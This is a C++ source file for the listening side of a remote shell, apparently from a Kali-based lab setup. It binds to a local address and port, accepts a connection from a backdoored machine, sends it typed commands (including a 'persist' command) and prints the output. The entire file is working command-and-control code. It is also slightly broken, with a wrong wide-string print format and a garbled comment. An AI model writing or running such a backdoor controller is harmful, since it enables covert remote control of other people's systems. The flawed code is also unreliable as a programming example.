
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> //linux
#include <sys/socket.h> //linux
#include <arpa/inet.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

//192.168.56.99
int main() {
	int sock, client_socket;
	char buffer[1024];
	char response[18384];
	struct sockaddr_in server_address, client_address;
	int i = 0;
	int optval = 1;

	socklen_t client_length;

	sock = socket(AF_INET, SOCK_STREAM, 0);

	if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (const char*)&optval, sizeof(optval)) < 0) {

		printf("Error Setting TCP Socket options!\n");
		return 1;
	}

	server_address.sin_family = AF_INET;

	server_address.sin_addr.s_addr = inet_addr("192.168.56.99"); //kali ip
	server_address.sin_port = htons(50008);

	bind(sock, (struct sockaddr*) &server_address, sizeof(server_address));
	listen(sock, 5);
	client_length = sizeof(client_address);
	client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length);
	while (1) {
	jump:
		bzero(&buffer, sizeof(buffer));
		bzero(&response, sizeof(response));
		printf("* Shell#%s~$: ", inet_ntoa(client_address.sin_addr));
		fgets(buffer, sizeof(buffer), stdin);
		strtok(buffer, "\n"); //¤À¸Ñ¦ê
		write(client_socket, buffer, sizeof(buffer));
		if (strncmp("q", buffer, 1) == 0) {
			break;
		}
		else if (strncmp("persist",buffer,7) ==0 ) {
			recv(client_socket, response, sizeof(response), 0);
			printf("%S", response);

		}
		else {

			recv(client_socket, response, sizeof(response), MSG_WAITALL);
			printf("%S", response);

		}



	}



}